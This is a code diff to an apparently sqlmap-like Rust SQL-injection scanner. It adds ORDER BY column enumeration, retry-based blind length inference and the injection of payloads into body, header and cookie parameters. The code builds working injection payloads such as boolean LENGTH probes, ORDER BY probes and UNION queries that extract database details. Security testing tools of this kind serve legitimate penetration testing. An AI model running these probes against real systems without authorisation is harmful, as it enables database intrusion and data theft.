@@ -166,38 +166,31 @@ impl Engine {
 
         // Detection per parameter — bounded concurrency via buffer_unordered
         let marker_set = MarkerSet::detect(target_str);
-        let params = if marker_set.has_any() {
-            // Marker mode: create synthetic params for each marker type
-            let mut v = Vec::new();
-            if marker_set.asterisk {
-                v.push(TargetParameter::new(
-                    "marker_asterisk",
-                    ParameterLocation::Query,
-                    "*",
-                ));
-            }
-            if marker_set.section {
-                v.push(TargetParameter::new(
-                    "marker_section",
-                    ParameterLocation::Query,
-                    "§",
-                ));
-            }
-            if marker_set.double_brace {
-                v.push(TargetParameter::new(
-                    "marker_brace",
-                    ParameterLocation::Query,
-                    "{{}}",
-                ));
-            }
-            if v.is_empty() {
-                crate::target::parameters::collect_from_url_query(&target)
-            } else {
-                v
-            }
-        } else {
-            crate::target::parameters::collect_from_url_query(&target)
-        };
+        let mut params = Vec::new();
+        // Marker mode: synthetic params, but also test real query params (don't ignore them)
+        if marker_set.asterisk {
+            params.push(TargetParameter::new(
+                "marker_asterisk",
+                ParameterLocation::Query,
+                "*",
+            ));
+        }
+        if marker_set.section {
+            params.push(TargetParameter::new(
+                "marker_section",
+                ParameterLocation::Query,
+                "§",
+            ));
+        }
+        if marker_set.double_brace {
+            params.push(TargetParameter::new(
+                "marker_brace",
+                ParameterLocation::Query,
+                "{{}}",
+            ));
+        }
+        // Always include real query params even when markers present (fixes #6)
+        params.extend(crate::target::parameters::collect_from_url_query(&target));
         let to_test: Vec<TargetParameter> = if params.is_empty() {
             vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
         } else {
@@ -332,17 +325,24 @@ impl Engine {
                 let f = st.findings().first().cloned();
                 drop(st);
                 if let Some(finding) = f {
-                    // try to recover param from finding.parameter "name@location"
-                    let name = finding
-                        .parameter
-                        .split('@')
-                        .next()
-                        .unwrap_or("id")
-                        .to_owned();
-                    (
-                        TargetParameter::new(name, ParameterLocation::Query, "1"),
-                        target.clone(),
-                    )
+                    // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header")
+                    let (name, loc_str) = match finding.parameter.split_once('@') {
+                        Some((n, l)) => (n.to_owned(), l.to_owned()),
+                        None => (finding.parameter.clone(), "query".to_owned()),
+                    };
+                    let location = if loc_str == "query" {
+                        ParameterLocation::Query
+                    } else if loc_str == "body" {
+                        ParameterLocation::Body
+                    } else if loc_str == "cookie" {
+                        ParameterLocation::Cookie
+                    } else if let Some(h) = loc_str.strip_prefix("header:") {
+                        ParameterLocation::Header(h.to_owned())
+                    } else {
+                        // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
+                        ParameterLocation::Query
+                    };
+                    (TargetParameter::new(name, location, "1"), target.clone())
                 } else {
                     // fallback synthetic
                     (
@@ -378,6 +378,7 @@ impl Engine {
             let marker_set_clone = marker_set.clone();
 
             // First, infer length via LENGTH(query) if possible (try lengths 1..64)
+            // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
             let mut inferred_len: usize = 0;
             for len_guess in 1..=64usize {
                 if cancel_clone.is_cancelled() {
@@ -400,24 +401,41 @@ impl Engine {
                         format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                     }
                 };
-                let url = inject_param_or_marker(
-                    &target_clone2,
-                    &target_str_clone,
-                    &first_param_clone,
-                    &payload,
-                    &marker_set_clone,
-                );
-                let (body, ms) =
-                    fetch_body_and_time_spec(&client_clone, url, &state_clone, &cancel_clone).await;
-                // heuristic: if body similar to baseline, then LENGTH >= len_guess true
-                let diff = crate::detection::response_diff::diff_against_baseline(
-                    &baseline_body,
-                    &body,
-                    baseline_mean,
-                    ms,
-                    100.0,
-                );
-                let is_true = diff.confidence < 0.4; // similar => true
+                // Retry logic: require 2 probes, treat as true only if majority true
+                let mut true_count = 0usize;
+                for _ in 0..2 {
+                    let spec = build_injection_spec(
+                        &target_clone2,
+                        &target_str_clone,
+                        &first_param_clone,
+                        &payload,
+                        &marker_set_clone,
+                    );
+                    let start = Instant::now();
+                    let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
+                    let ms = start.elapsed().as_secs_f64() * 1000.0;
+                    state_clone.write().await.increment_requests();
+                    let body = match resp {
+                        Ok(r) => r.text().await.unwrap_or_default(),
+                        Err(_) => String::new(),
+                    };
+                    let diff = crate::detection::response_diff::diff_against_baseline(
+                        &baseline_body,
+                        &body,
+                        baseline_mean,
+                        ms,
+                        100.0,
+                    );
+                    if diff.confidence < 0.4 {
+                        true_count += 1;
+                    }
+                    // small jitter between retries
+                    if cancel_clone.is_cancelled() {
+                        break;
+                    }
+                }
+                let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
+                // If we saw 0 true after 2 trials, length guess exceeded
                 if !is_true {
                     inferred_len = len_guess - 1;
                     break;
@@ -427,7 +445,8 @@ impl Engine {
                 }
             }
             if inferred_len == 0 {
-                inferred_len = 16; // fallback
+                warn!("length inference failed, falling back to 16");
+                inferred_len = 16; // fallback with warning
             }
             info!(len=%inferred_len, "inferred version length");
 
@@ -487,9 +506,17 @@ impl Engine {
                             mid
                         ),
                     };
-                    let url =
-                        inject_param_or_marker(&target, &target_str, &param, &payload, &marker_set);
-                    let (body, ms) = fetch_body_and_time_spec(&client, url, &state, &cancel).await;
+                    // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
+                    let spec =
+                        build_injection_spec(&target, &target_str, &param, &payload, &marker_set);
+                    let start = Instant::now();
+                    let resp = client.send_with_retry(spec, &cancel).await;
+                    let ms = start.elapsed().as_secs_f64() * 1000.0;
+                    state.write().await.increment_requests();
+                    let body = match resp {
+                        Ok(r) => r.text().await.unwrap_or_default(),
+                        Err(_) => String::new(),
+                    };
                     let diff = crate::detection::response_diff::diff_against_baseline(
                         &baseline_body,
                         &body,
@@ -649,9 +676,21 @@ fn inject_param(target: &TargetUrl, param: &TargetParameter, payload: &str) -> S
 #[allow(clippy::collapsible_if)]
 fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -> String {
     let mut s = target_str.to_owned();
-    if marker_set.asterisk && s.contains('*') {
-        s = s.replace('*', payload);
-        return s;
+    if marker_set.asterisk {
+        if s.contains('*') {
+            // Replace only first occurrence to avoid over-broad replacement
+            if let Some(pos) = s.find('*') {
+                s.replace_range(pos..pos + 1, payload);
+                return s;
+            }
+        } else {
+            // Handle encoded asterisk %2A (case-insensitive) when URL is percent-encoded
+            let lower = s.to_ascii_lowercase();
+            if let Some(pos) = lower.find("%2a") {
+                s.replace_range(pos..pos + 3, payload);
+                return s;
+            }
+        }
     }
     if marker_set.section {
         // §payload§ -> replace inner
@@ -680,6 +719,7 @@ fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -
     }
 }
 
+#[allow(dead_code)]
 fn inject_param_or_marker(
     target: &TargetUrl,
     target_str: &str,
@@ -694,6 +734,62 @@ fn inject_param_or_marker(
     }
 }
 
+fn inject_body_param(
+    raw: Option<&crate::target::raw_request::RawRequest>,
+    param: &TargetParameter,
+    payload: &str,
+) -> (Method, String, http::HeaderMap) {
+    let method = raw
+        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
+        .unwrap_or(Method::POST);
+    let existing_body = raw.and_then(|r| r.body.as_deref());
+    let body_str = if let Some(body) = existing_body {
+        // Preserve other body fields, replace only target param
+        let mut pairs: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
+            .map(|(k, v)| (k.into_owned(), v.into_owned()))
+            .collect();
+        let mut found = false;
+        for (k, v) in &mut pairs {
+            if k == &param.name {
+                *v = payload.to_owned();
+                found = true;
+            }
+        }
+        if !found {
+            pairs.push((param.name.clone(), payload.to_owned()));
+        }
+        url::form_urlencoded::Serializer::new(String::new())
+            .extend_pairs(pairs)
+            .finish()
+    } else {
+        format!(
+            "{}={}",
+            param.name,
+            url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
+        )
+    };
+    let mut headers = http::HeaderMap::new();
+    headers.insert(
+        http::header::CONTENT_TYPE,
+        http::HeaderValue::from_static("application/x-www-form-urlencoded"),
+    );
+    // Preserve other headers from raw request (e.g., Host, User-Agent)
+    if let Some(r) = raw {
+        for (k, v) in &r.headers {
+            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
+                continue;
+            }
+            if let (Ok(name), Ok(val)) = (
+                http::HeaderName::from_bytes(k.as_bytes()),
+                http::HeaderValue::from_str(v),
+            ) {
+                headers.insert(name, val);
+            }
+        }
+    }
+    (method, body_str, headers)
+}
+
 fn build_injection_spec(
     target: &TargetUrl,
     target_str: &str,
@@ -701,48 +797,106 @@ fn build_injection_spec(
     payload: &str,
     marker_set: &MarkerSet,
 ) -> RequestSpec {
+    build_injection_spec_with_raw(target, target_str, param, payload, marker_set, None)
+}
+
+fn build_injection_spec_with_raw(
+    target: &TargetUrl,
+    target_str: &str,
+    param: &TargetParameter,
+    payload: &str,
+    marker_set: &MarkerSet,
+    raw: Option<&crate::target::raw_request::RawRequest>,
+) -> RequestSpec {
     if marker_set.has_any() && param.name.starts_with("marker_") {
         let url = inject_with_marker(target_str, payload, marker_set);
-        return RequestSpec::new(Method::GET, url);
+        // Preserve method from raw request if available
+        let method = raw
+            .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
+            .unwrap_or(Method::GET);
+        return RequestSpec::new(method, url);
     }
     match &param.location {
         ParameterLocation::Query => {
             let url = inject_param(target, param, payload);
-            RequestSpec::new(Method::GET, url)
+            let method = raw
+                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
+                .unwrap_or(Method::GET);
+            RequestSpec::new(method, url)
         }
         ParameterLocation::Body => {
-            // Build x-www-form-urlencoded body with payload replaced
-            let body_str = format!(
-                "{}={}",
-                param.name,
-                url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
-            );
-            let mut headers = http::HeaderMap::new();
-            headers.insert(
-                http::header::CONTENT_TYPE,
-                http::HeaderValue::from_static("application/x-www-form-urlencoded"),
-            );
-            RequestSpec::new(Method::POST, target.as_str().to_owned())
+            let (method, body_str, headers) = inject_body_param(raw, param, payload);
+            RequestSpec::new(method, target.as_str().to_owned())
                 .with_headers(headers)
                 .with_body(body_str.into_bytes())
         }
         ParameterLocation::Header(h) => {
             let mut headers = http::HeaderMap::new();
+            // Preserve existing headers from raw request
+            if let Some(r) = raw {
+                for (k, v) in &r.headers {
+                    if let (Ok(name), Ok(val)) = (
+                        http::HeaderName::from_bytes(k.as_bytes()),
+                        http::HeaderValue::from_str(v),
+                    ) {
+                        headers.insert(name, val);
+                    }
+                }
+            }
             if let (Ok(name), Ok(val)) = (
                 http::HeaderName::from_bytes(h.as_bytes()),
                 http::HeaderValue::from_str(payload),
             ) {
                 headers.insert(name, val);
             }
-            RequestSpec::new(Method::GET, target.as_str().to_owned()).with_headers(headers)
+            let method = raw
+                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
+                .unwrap_or(Method::GET);
+            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
         }
         ParameterLocation::Cookie => {
             let mut headers = http::HeaderMap::new();
-            let cookie_val = format!("{}={}", param.name, payload);
+            // Preserve existing headers, but rebuild Cookie header to preserve other cookies
+            let mut cookies: Vec<(String, String)> = Vec::new();
+            if let Some(r) = raw {
+                for (k, v) in &r.headers {
+                    if k.eq_ignore_ascii_case("cookie") {
+                        for part in v.split(';') {
+                            if let Some((ck, cv)) = part.trim().split_once('=') {
+                                cookies.push((ck.trim().to_owned(), cv.trim().to_owned()));
+                            }
+                        }
+                    } else if let (Ok(name), Ok(val)) = (
+                        http::HeaderName::from_bytes(k.as_bytes()),
+                        http::HeaderValue::from_str(v),
+                    ) {
+                        headers.insert(name, val);
+                    }
+                }
+            }
+            // Replace or insert target cookie
+            let mut found = false;
+            for (ck, cv) in &mut cookies {
+                if ck == &param.name {
+                    *cv = payload.to_owned();
+                    found = true;
+                }
+            }
+            if !found {
+                cookies.push((param.name.clone(), payload.to_owned()));
+            }
+            let cookie_val = cookies
+                .into_iter()
+                .map(|(k, v)| format!("{k}={v}"))
+                .collect::<Vec<_>>()
+                .join("; ");
             if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
                 headers.insert(http::header::COOKIE, val);
             }
-            RequestSpec::new(Method::GET, target.as_str().to_owned()).with_headers(headers)
+            let method = raw
+                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
+                .unwrap_or(Method::GET);
+            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
         }
     }
 }
@@ -792,6 +946,7 @@ async fn fetch_body_and_time(
     }
 }
 
+#[allow(dead_code)]
 async fn fetch_body_and_time_spec(
     client: &HttpClient,
     url: String,
@@ -976,6 +1131,45 @@ async fn test_time_bounded(
     }
 }
 
+/// Enumerate column count via ORDER BY probing before UNION.
+/// Sequential probing `ORDER BY 1 .. MAX`, stops at first error detected by
+/// `UnionDetector::evaluate_order_by`. Returns `Some(n)` where `n = failed_index - 1`.
+/// Rate limiting and jitter are preserved via `fetch_for_payload`; cancellation is honoured.
+#[allow(clippy::too_many_arguments)]
+async fn enumerate_columns_via_order_by(
+    client: &HttpClient,
+    state: &Arc<RwLock<SessionState>>,
+    cancel: &CancellationToken,
+    target: &TargetUrl,
+    target_str: &str,
+    param: &TargetParameter,
+    marker_set: &MarkerSet,
+    detector: &UnionDetector,
+) -> Option<usize> {
+    const MAX_ORDER_BY_COLS: usize = 10;
+    for i in 1..=MAX_ORDER_BY_COLS {
+        if cancel.is_cancelled() {
+            return None;
+        }
+        let payload = format!("' ORDER BY {i} -- -");
+        let (body, _ms) = fetch_for_payload(
+            client, state, cancel, target, target_str, param, &payload, marker_set,
+        )
+        .await;
+        if detector.evaluate_order_by(&body) {
+            if i == 1 {
+                warn!("ORDER BY 1 already errored — ORDER BY enumeration inconclusive");
+                return None;
+            }
+            let inferred = i - 1;
+            info!(inferred, "ORDER BY enumeration inferred column count");
+            return Some(inferred);
+        }
+    }
+    info!("ORDER BY enumeration found no error up to {MAX_ORDER_BY_COLS} — undetermined");
+    None
+}
+
 #[allow(clippy::too_many_arguments)]
 async fn test_union_bounded(
     client: &HttpClient,
@@ -989,8 +1183,63 @@ async fn test_union_bounded(
 ) {
     let detector = UnionDetector::new();
     let baseline_body = baseline.representative_body_str();
-    // Try column counts 2..5
-    for cols in [3usize, 2, 4, 5] {
+
+    // Phase 0 — ORDER BY enumeration to reduce false positives.
+    // If we successfully infer `n`, we test only `n` first. If that fails, we
+    // still fall back to the heuristic list (excluding the already-tried `n`) to
+    // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
+    let inferred = enumerate_columns_via_order_by(
+        client, state, cancel, target, target_str, param, marker_set, &detector,
+    )
+    .await;
+
+    let mut cols_to_try: Vec<usize> = Vec::new();
+    let mut fallback = vec![3usize, 2, 4, 5];
+    if let Some(n) = inferred {
+        cols_to_try.push(n);
+        // Keep fallback for resilience but avoid duplicate probe
+        fallback.retain(|c| *c != n);
+    } else {
+        cols_to_try = fallback.clone();
+        fallback.clear();
+    }
+
+    // Primary pass: inferred or heuristic
+    for cols in &cols_to_try {
+        if cancel.is_cancelled() {
+            return;
+        }
+        let cols = *cols;
+        let payloads = union_payloads_for(None, cols);
+        for p in payloads.iter().take(1) {
+            if cancel.is_cancelled() {
+                return;
+            }
+            let (body, ms) = fetch_for_payload(
+                client, state, cancel, target, target_str, param, &p.payload, marker_set,
+            )
+            .await;
+            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
+            if r.is_vulnerable {
+                let mut finding = Finding::new(
+                    target.as_str(),
+                    param.key(),
+                    TechniqueKind::Union,
+                    r.confidence,
+                    format!(
+                        "union columns={:?} payload={} order_by_inferred={:?}",
+                        r.columns, p.payload, inferred
+                    ),
+                );
+                finding.dbms = Some(p.dbms.clone());
+                state.write().await.push_finding(finding);
+                return;
+            }
+        }
+    }
+
+    // Secondary pass: fallback heuristic if primary (inferred) yielded nothing
+    for cols in fallback {
         if cancel.is_cancelled() {
             break;
         }
@@ -1003,14 +1252,17 @@ async fn test_union_bounded(
                 client, state, cancel, target, target_str, param, &p.payload, marker_set,
             )
             .await;
-            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms);
+            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
             if r.is_vulnerable {
                 let mut finding = Finding::new(
                     target.as_str(),
                     param.key(),
                     TechniqueKind::Union,
                     r.confidence,
-                    format!("union columns={:?} payload={}", r.columns, p.payload),
+                    format!(
+                        "union columns={:?} payload={} order_by_inferred={:?} (fallback)",
+                        r.columns, p.payload, inferred
+                    ),
                 );
                 finding.dbms = Some(p.dbms.clone());
                 state.write().await.push_finding(finding);
